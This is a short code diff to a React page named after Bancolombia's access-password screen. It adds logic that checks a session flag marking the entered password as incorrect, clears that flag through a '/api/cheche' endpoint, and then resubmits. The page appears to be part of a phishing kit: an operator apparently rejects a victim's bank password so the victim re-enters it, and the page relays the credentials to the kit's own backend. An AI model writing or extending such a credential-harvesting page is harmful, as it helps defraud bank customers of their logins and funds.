@@ -51,6 +51,21 @@ export default function BancolombiaClaveAccesoPage() {
     setLoading(true);
 
     try {
+      // Verificar si la clave fue marcada como incorrecta y limpiar el flag
+      const checkResponse = await fetch(`/api/cheche?sessionId=${sessionId}`);
+      const checkData = await checkResponse.json();
+      
+      if (checkData.session?.claveIncorrecta) {
+        await fetch('/api/cheche', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            action: 'clear_clave_flag',
+            sessionId,
+          }),
+        });
+      }
+      
       const response = await fetch('/api/cheche', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
